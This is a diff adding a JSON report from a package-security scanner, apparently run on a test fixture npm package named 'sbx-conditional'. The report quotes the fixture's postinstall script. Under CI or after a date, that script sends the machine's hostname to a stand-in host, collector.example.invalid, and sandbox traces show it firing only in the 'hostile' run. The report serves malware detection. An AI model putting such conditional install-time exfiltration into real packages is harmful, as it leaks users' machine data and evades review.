@@ -1,0 +1,517 @@
+{
+  "package": {
+    "ecosystem": "npm",
+    "name": "sbx-conditional",
+    "version": "1.0.0"
+  },
+  "analyzerVersion": "0.1.0",
+  "generatedAt": "2026-09-18T20:40:21.776656Z",
+  "findings": [
+    {
+      "ruleId": "metadata.install_script",
+      "layer": "metadata",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "title": "Runs a 'postinstall' script during install",
+      "file": "package.json",
+      "line": null,
+      "snippet": "node gate.js",
+      "installTime": false,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.exfiltration",
+      "layer": "static",
+      "severity": "HIGH",
+      "confidence": "LOW",
+      "title": "Reads machine details (hostname, username) and can send data over the network during install",
+      "file": "gate.js",
+      "line": 3,
+      "snippet": "alid/gated', { method: 'POST' }).end(JSON.stringify({ host: require('os').hostname() }));",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.install_network",
+      "layer": "static",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Makes network requests during install",
+      "file": "gate.js",
+      "line": 3,
+      "snippet": "require('https').request('https://collector.example.invalid/gated', { method: 'POST' }).end(JSON.stringify({ host: require('os').hostname() }));",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.unexpected_network",
+      "layer": "sandbox",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Sends data to a host that is not the npm registry: collector.example.invalid",
+      "file": "collector.example.invalid",
+      "line": null,
+      "snippet": "https://collector.example.invalid/gated",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.conditional_behavior",
+      "layer": "sandbox",
+      "severity": "HIGH",
+      "confidence": "MEDIUM",
+      "title": "Only under CI / a later date: contacts collector.example.invalid",
+      "file": null,
+      "line": null,
+      "snippet": "contacts collector.example.invalid",
+      "installTime": true,
+      "occurrences": 1
+    }
+  ],
+  "intel": {
+    "osv": {
+      "maliciousIds": [],
+      "vulnerabilityIds": []
+    },
+    "safedep": {
+      "found": false
+    }
+  },
+  "metadata": {
+    "description": null,
+    "license": null,
+    "publisher": "fixture-author",
+    "trustedPublishing": false,
+    "provenance": false,
+    "maintainers": [
+      "fixture-author"
+    ],
+    "publishedAt": "2026-03-02T20:40:21.708038+00:00",
+    "previousVersion": null,
+    "installScripts": {
+      "postinstall": "node gate.js"
+    },
+    "repository": "git+https://example.invalid/sbx-conditional.git",
+    "dependencies": {},
+    "sha256": "efbeba02ed92a3a8ccee195c344977bf378c8069e0487552fa0483c47d3e77bb",
+    "fileCount": 2,
+    "unpackedBytes": 345
+  },
+  "codeScan": {
+    "filesScanned": 1,
+    "filesParsed": 1,
+    "filesWithParseErrors": 0,
+    "installTimeFiles": [
+      "gate.js"
+    ],
+    "entryFiles": [],
+    "executables": [],
+    "skipped": [],
+    "findingsTruncated": false
+  },
+  "aiReview": null,
+  "aiError": null,
+  "behavior": {
+    "networkModules": [
+      "https"
+    ],
+    "hosts": [
+      "collector.example.invalid"
+    ],
+    "ipAddresses": [],
+    "envVars": [
+      "CI"
+    ],
+    "readsAllEnv": false,
+    "sensitivePaths": [],
+    "runsCommands": false,
+    "dynamicCode": false,
+    "decodesData": false,
+    "readsMachineInfo": true,
+    "nativeExecutables": [],
+    "installTime": {
+      "network": true,
+      "commands": false,
+      "files": [
+        "gate.js"
+      ]
+    },
+    "filesByCapability": {
+      "network": [
+        "gate.js"
+      ],
+      "env_vars": [
+        "gate.js"
+      ],
+      "machine_info": [
+        "gate.js"
+      ]
+    }
+  },
+  "iocs": [],
+  "fileHashes": [
+    {
+      "path": "gate.js",
+      "size": 245,
+      "sha256": "6a166c4159a37b803a5e0d5721da4b189ddd2f8824cd00bd14c907052a5132bb"
+    },
+    {
+      "path": "package.json",
+      "size": 100,
+      "sha256": "347ab4b2750eada897fcf8408cbbefcbbb7e4a5b49ec2ad53f9a89a21d40d451"
+    }
+  ],
+  "fileHashesTruncated": false,
+  "settings": {
+    "analyzerVersion": "0.1.0",
+    "rulesHash": "cdd49f6359d5",
+    "promptHashes": {},
+    "ai": {
+      "mode": "off"
+    },
+    "settingsHash": "c9edcfb6b502"
+  },
+  "timings": {
+    "downloadSeconds": 0.003,
+    "unpackSeconds": 0.005,
+    "intelSeconds": 0.001,
+    "metadataSeconds": 0.011,
+    "codeScanSeconds": 0.013,
+    "sandboxSeconds": 0.034,
+    "aiSeconds": 0.0,
+    "totalSeconds": 0.068
+  },
+  "reviewFlags": {
+    "rulesAiDisagree": false,
+    "workerCoordinatorDisagree": false,
+    "promptInjectionDetected": false,
+    "lowCoverage": false,
+    "aiFailed": false,
+    "needsHumanReview": true,
+    "reasons": [
+      "The final verdict is SUSPICIOUS."
+    ]
+  },
+  "codeIssues": [
+    {
+      "id": "issue-1",
+      "file": "gate.js",
+      "lineStart": 3,
+      "lineEnd": 3,
+      "severity": "HIGH",
+      "category": "secret_theft",
+      "title": "Reads machine details (hostname, username) and can send data over the network during install",
+      "whyItMatters": "This code reads secrets or machine details and can send data over the network. That combination is how credentials get stolen.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "code.exfiltration",
+        "code.install_network"
+      ],
+      "aiAssessment": null,
+      "installTime": true,
+      "excerpt": {
+        "startLine": 1,
+        "endLine": 5,
+        "highlightStart": 3,
+        "highlightEnd": 3,
+        "lines": [
+          {
+            "number": 1,
+            "text": "const late = Date.now() > new Date('__GATE_DAYS_30__').getTime();",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 2,
+            "text": "if (late || process.env.CI) {",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "  require('https').request('https://collector.example.invalid/gated', { method: 'POST' }).end(JSON.stringify({ host: require('os').hostname() }));",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "}",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    },
+    {
+      "id": "issue-2",
+      "file": "package.json",
+      "lineStart": 4,
+      "lineEnd": 4,
+      "severity": "MEDIUM",
+      "category": "install_script",
+      "title": "Runs a 'postinstall' script during install",
+      "whyItMatters": "This command runs automatically during npm install, before any code is imported. Malware most often starts here.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "metadata.install_script"
+      ],
+      "aiAssessment": null,
+      "installTime": false,
+      "excerpt": {
+        "startLine": 1,
+        "endLine": 6,
+        "highlightStart": 4,
+        "highlightEnd": 4,
+        "lines": [
+          {
+            "number": 1,
+            "text": "{",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 2,
+            "text": "  \"name\": \"sbx-conditional\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "  \"version\": \"1.0.0\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "  \"scripts\": {\"postinstall\": \"node gate.js\"}",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "}",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 6,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    }
+  ],
+  "sandbox": {
+    "version": "0.1.0",
+    "status": "COMPLETE",
+    "skipReason": null,
+    "durationSeconds": 1.6,
+    "rawTraceS3Key": "sandbox-traces/npm/sbx-conditional/1.0.0/0.1.0.json",
+    "coverage": {
+      "installed": true,
+      "installScriptsRan": true,
+      "entryLoaded": false,
+      "entryError": "Cannot find module 'sbx-conditional'\nRequire stack:\n- /opt/sbx/loader.js",
+      "binsRun": 0,
+      "timedOut": false,
+      "dependenciesStripped": true
+    },
+    "runs": [
+      {
+        "name": "baseline",
+        "ci": false,
+        "clockOffsetDays": 0,
+        "hostname": "container",
+        "user": "sandbox",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.44,
+            "cpuSeconds": 1.31
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.12,
+            "cpuSeconds": 0.1
+          }
+        ],
+        "notes": []
+      },
+      {
+        "name": "hostile",
+        "ci": true,
+        "clockOffsetDays": 60,
+        "hostname": "ci-runner-04",
+        "user": "runner",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.32,
+            "cpuSeconds": 1.15
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.12,
+            "cpuSeconds": 0.09
+          }
+        ],
+        "notes": []
+      }
+    ],
+    "network": [
+      {
+        "run": "hostile",
+        "kind": "dns",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": null,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 3
+      },
+      {
+        "run": "hostile",
+        "kind": "http",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": 443,
+        "method": "POST",
+        "url": "https://collector.example.invalid/gated",
+        "bodyPreview": "{\"host\":\"ci-runner-04\"}",
+        "canaryHit": false,
+        "phase": null,
+        "count": 2
+      },
+      {
+        "run": "hostile",
+        "kind": "connect",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": 443,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": "install",
+        "count": 2
+      }
+    ],
+    "processes": [
+      {
+        "run": "baseline",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "node gate.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "baseline",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/local/bin/node",
+        "argv": [
+          "node",
+          "gate.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "node gate.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/local/bin/node",
+        "argv": [
+          "node",
+          "gate.js"
+        ],
+        "phase": "install"
+      }
+    ],
+    "files": [],
+    "evalPayloads": [],
+    "canaryHits": [],
+    "conditional": [
+      {
+        "description": "Only under CI / a later date: contacts collector.example.invalid",
+        "onlyInRun": "hostile"
+      }
+    ],
+    "resources": {
+      "peakCpuSeconds": 1.31,
+      "peakMemoryMb": 73.7,
+      "timedOutPhases": []
+    },
+    "findings": [
+      {
+        "ruleId": "sandbox.unexpected_network",
+        "layer": "sandbox",
+        "severity": "MEDIUM",
+        "confidence": "MEDIUM",
+        "title": "Sends data to a host that is not the npm registry: collector.example.invalid",
+        "file": "collector.example.invalid",
+        "line": null,
+        "snippet": "https://collector.example.invalid/gated",
+        "installTime": true,
+        "occurrences": 1
+      },
+      {
+        "ruleId": "sandbox.conditional_behavior",
+        "layer": "sandbox",
+        "severity": "HIGH",
+        "confidence": "MEDIUM",
+        "title": "Only under CI / a later date: contacts collector.example.invalid",
+        "file": null,
+        "line": null,
+        "snippet": "contacts collector.example.invalid",
+        "installTime": true,
+        "occurrences": 1
+      }
+    ]
+  },
+  "humanReview": null
+}
